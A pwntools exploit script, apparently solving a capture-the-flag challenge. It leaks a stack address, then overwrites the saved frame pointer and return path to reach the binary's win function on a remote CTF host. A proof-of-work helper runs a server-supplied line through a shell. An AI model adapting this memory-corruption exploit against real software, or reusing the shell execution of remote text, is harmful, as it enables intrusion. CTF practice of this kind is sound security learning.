#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from keystone import *
from capstone import *

bin_path = "./chall_patched"
exe = context.binary = ELF(args.EXE or bin_path)
context.terminal = "alacritty -e".split()
context.log_level = "debug" if args.DEBUG else "info"
_, host, port = "nc challenges.ctf.sd 34828".split()

libc_path = "./libc.so.6"
ld_path = "./ld-linux-x86-64.so.2"
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None


class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            error(f'"{name}" doesn\'t exist')
            return lambda: ...

        if hasattr(resolved, "address"):
            resolved = getattr(resolved, "address")

            if not resolved & 0xFFF:
                success(term.text.bold_green(f"{name}.address & 0xFFF == 0"))
            else:
                warn(term.text.bold_yellow(f"{name}.address & 0xFFF != 0"))

        info(term.text.blue(f"{name} : {resolved:#x}"))
        return lambda: ...


logx = LogAddressHex()


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    kw["env"] = {"SHELL": "/bin/sh"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def fasm(code, pp=True):
    ks = Ks(KS_ARCH_X86, KS_MODE_64 if context.arch == "amd64" else KS_MODE_32)
    if pp:
        code = cpp(code)
    encoding, _ = ks.asm(code)
    return bytes(encoding)


def fdisasm(code, vma=0x0):
    md = Cs(CS_ARCH_X86, CS_MODE_64 if context.arch == "amd64" else CS_MODE_32)
    instructions = []
    for i in md.disasm(code, vma):
        instructions.append("0x{:x}:\t{}\t{}".format(i.address, i.mnemonic, i.op_str))
    return "\n".join(instructions)


def ua(x):
    return int.from_bytes(x, "little")


def se(x):
    return str(x).encode()


def cyc(x):
    n = 8 if context.arch == "amd64" else 4
    return cyclic(x, n=n)


def solve_pow(crib=b"pwn.red"):
    if args.LOCAL:
        return
    with log.progress("Solving PoW..."):
        cmd = p.recvline_contains(crib).decode().strip()
        output = subprocess.check_output(cmd, shell=True)
        p.sendline(output)


gdbscript = """
b *0x4013E7
continue
""".format(**locals())

p = start()
p.sendlineafter(b"Exit", b"1")
p.sendlineafter(b"Enter size:", b"32")
p.sendafter(b"Enter your message:", b"A" * 24)
p.recvuntil(b"A" * 24)
leak = p.recvline().rstrip()
leaked_addr = ua(leak)
logx.leaked_addr

target_rbp = leaked_addr + 0x10
logx.target_rbp

p.sendlineafter(b"Exit", b"1")
p.sendlineafter(b"Enter size:", b"32")
payload2 = flat(
    b"B" * 48,
    target_rbp - 0x130,
    0x4013C8,
    b"ADAMADAM" * 5,
    exe.sym._Z3winv,
)
p.sendafter(b"Enter your message:", payload2)
p.sendline(b"2")
p.interactive()
